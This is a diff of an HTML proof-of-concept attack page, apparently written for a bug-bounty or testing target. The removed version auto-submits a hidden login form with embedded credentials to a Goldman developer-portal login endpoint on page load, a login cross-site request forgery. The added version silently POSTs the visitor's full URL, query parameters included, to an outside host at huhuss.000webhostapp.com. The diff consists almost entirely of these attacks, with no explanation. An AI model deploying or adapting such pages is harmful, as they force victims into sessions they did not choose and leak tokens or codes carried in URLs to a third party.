@@ -1,19 +1,28 @@
+<!DOCTYPE html>
 <html>
-	<body>
-		<form name='myForm' id='myForm' method="POST" action="https://developer.xs2a.goldman.com/user/login">
-			<input type="hidden" name="registry_url" value="%2Fconsumer-api%2Fuser-registries%2Ff0d49b27-41a8-4b0e-bc75-c0f70da071e0"/>
-			<input type="hidden" name="name" value="Huhuudz22"/>
-			<input type="hidden" name="pass" value="Huhu"/>
-			<input type="hidden" name="op" value="Sign+in"/>
-			<input type="hidden" name="form_build_id" value="form-X9buRrzT710G_CRMHUfXb10DGLWMlGSuKDdwOrCEUKo"/>
-			<input type="hidden" name="form_id" value="user_login_form"/>
-			<input type="submit" value="Submit">
-		</form>
-		<script>
-			document.addEventListener('DOMContentLoaded', function(event) {
-				document.createElement('form').submit.call(document.getElementById('myForm'));
-				});
-		</script>
-	</body>
-<html>
- 
+<head>
+    <title>Save URL Example</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+    <script>
+        $(document).ready(function() {
+            // Get the complete URL with query parameters
+            var completeUrl = window.location.href;
+
+            // Send the complete URL to save.php using AJAX
+            $.ajax({
+                type: "POST",
+                url: "https://huhuss.000webhostapp.com/save.php",
+                data: { url: completeUrl },
+                success: function(response) {
+                    console.log("URL saved successfully!");
+                },
+                error: function(xhr, status, error) {
+                    console.error("Error saving URL:", error);
+                }
+            });
+        });
+    </script>
+</body>
+</html>
